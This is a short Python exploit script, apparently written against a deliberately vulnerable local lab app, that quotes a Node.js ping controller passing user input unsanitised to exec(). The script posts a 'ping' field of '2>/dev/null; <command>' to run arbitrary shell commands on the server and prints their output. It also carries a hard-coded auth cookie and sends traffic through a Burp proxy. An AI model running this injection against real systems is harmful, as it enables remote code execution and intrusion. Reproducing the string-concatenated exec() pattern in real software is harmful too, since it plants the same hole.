# Vulnerable portion of the code.

'''
    controllers/vuln_controller.js

    const ping_post = (req, res) => {
    const ping = req.body.ping;
    const ping1 = req.body.ping1;
    if (ping) {
        exec('ping -c 3 ' + req.body.ping, function(err, stdout, stderr) {
        output = stdout + stderr;
        res.render('ping', {
            output: output,
            pingoutput: null,
        });
        });
    }
    if (ping1) {
        execFile('/usr/bin/ping', ['-c', '3', ping1], function(err, stdout, stderr) {
        pingoutput = stdout + stderr;
        res.render('ping', {
            pingoutput: pingoutput,
            output: null,
        });
        });
    }
    };
'''

import requests
import re
import argparse

# Argument parser setup
parser = argparse.ArgumentParser(description="Exploit RCE via command injection and extract output.")
parser.add_argument("-c", "--command", required=True, help="Command to execute (e.g., 'ls -lah')")
args = parser.parse_args()

# Target URL
url = "http://localhost:9000/ping"

# Proxy settings for Burp Suite interception
proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080",
}

# Headers (adjust if necessary)
headers = {
    "Host": "localhost:9000",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://localhost:9000/ping",
    "Connection": "keep-alive",
    "Cookie": "authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiaWF0IjoxNzQxNTAwMDE4fQ.nqUz-L-Kq_-vkKlKnOY_WfLigkVZmm3Fqh6OmNeXN9w",
}

# Data payload (command injection)
data = {
    "ping": f"2>/dev/null; {args.command}"
}

# Send POST request
response = requests.post(url, headers=headers, data=data, proxies=proxies, verify=False)

# Extract output inside <pre>...</pre>
match = re.search(r"<pre>(.*?)</pre>", response.text, re.DOTALL)
if match:
    print(match.group(1).strip())
else:
    print("No <pre> tags found in response.")